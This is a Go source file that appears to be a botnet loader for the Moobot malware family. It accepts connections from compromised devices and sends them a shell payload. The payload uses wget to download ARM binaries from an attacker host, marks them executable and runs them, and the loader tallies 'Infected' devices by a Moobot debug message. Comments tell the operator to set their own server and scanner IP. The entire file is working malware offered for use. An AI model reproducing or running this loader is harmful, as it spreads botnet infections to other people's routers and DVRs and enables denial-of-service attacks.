package main

import (
	"fmt"
    "net"
    "time"
    "strings"
)

// Change Server IP and bin name
var payload string = `
cd /dev

wget http://1.3.3.7/arm7 
chmod 777 arm7
./arm7 arm7.tenda

wget http://1.3.3.7/arm
chmod 777 arm
./arm arm7.tenda


 
/var/Sofia 2>/dev/null &
`
var dirChange, statusAttempted, statusInfected, echoDropped, statusFailed int

func zeroByte(a []byte) {
    for i := range a {
        a[i] = 0
    }
}

func loaderThread(conn net.Conn) {
	defer conn.Close()
	buf := make([]byte, 512)
	conn.SetWriteDeadline(time.Now().Add(60 * time.Second))

	conn.Write([]byte(payload))

	statusAttempted++
	conn.SetReadDeadline(time.Now().Add(30 * time.Second))
	for {
		le, err := conn.Read(buf)
		if err != nil || le <= 0 {
			break
		}

		if strings.Contains(string(buf), "listening to tun0") { // Moobot debug message 
			statusInfected++
			break
		}
	}

	zeroByte(buf)
	return
}

func main() {

	li, err := net.Listen("tcp", "1.3.3.7:31337") // Change this to scanner IP
	if err != nil {
		return
    }

	var i int = 0
	go func() {
		for {
			fmt.Printf("%d's | Attempted %d | Infected %d\r\n", i, statusAttempted, statusInfected)
			time.Sleep(1 * time.Second)
			i++
		}
	} ()

	go func() {
		for {
			conn, err := li.Accept()
			if err != nil {
				break
			}

			go loaderThread(conn)
		}
	} ()

    for {
        time.Sleep(1 * time.Second)
    }
}
